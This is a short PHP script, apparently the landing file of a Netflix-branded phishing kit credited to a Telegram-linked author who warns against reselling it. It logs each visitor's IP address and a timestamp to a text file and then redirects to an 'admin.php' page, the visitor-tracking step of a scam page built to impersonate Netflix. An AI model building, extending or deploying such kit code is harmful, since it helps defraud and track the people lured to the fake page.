<?php
/**
 * DO NOT SELL THIS SCRIPT ! 
 * DO NOT CHANGE COPYRIGHT !
 * NETFLIX -
 * version 3
 *  telegram = @MrxTawFik
  * channel telegram = @mrx_tawfik
 
###############################################
#                                C0d3d by Mrx TawFik                                            #
#                  Recording doesn't  make you a Coder                              #
#                             Copyright 2023 NETFLIX                                          #
###############################################

**/
$ip = getenv("REMOTE_ADDR");
$file = fopen("vu.txt","a");
fwrite($file,$ip."  -  ".gmdate ("Y-n-d")." @ ".gmdate ("H:i:s")."\n");
header("location: admin.php");

?>